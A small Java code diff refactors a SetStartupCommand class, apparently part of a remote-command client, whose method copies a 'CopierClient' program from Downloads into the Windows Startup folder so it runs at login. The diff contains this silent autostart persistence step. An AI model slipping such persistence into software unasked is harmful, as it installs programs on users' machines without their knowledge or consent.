@@ -2,16 +2,22 @@ package commands;
 
 import java.io.IOException;
 
-public class SetStartupCommand implements Command {
+import command.AbstractCommand;
+import model.ModelClient;
+
+public class SetStartupCommand extends AbstractCommand {
+
+	public SetStartupCommand(ModelClient _model) {
+		super(_model);
+	}
 
 	@Override
-	public String execute() {
+	public String execute(String args) {
 		String[] CMD={"copy", "%userprofile%/Downloads/CopierClient", "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"};
 		try {
 			Runtime.getRuntime().exec(CMD);
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			model.getLogger().error(e);
 		}
 		return null;
 	}
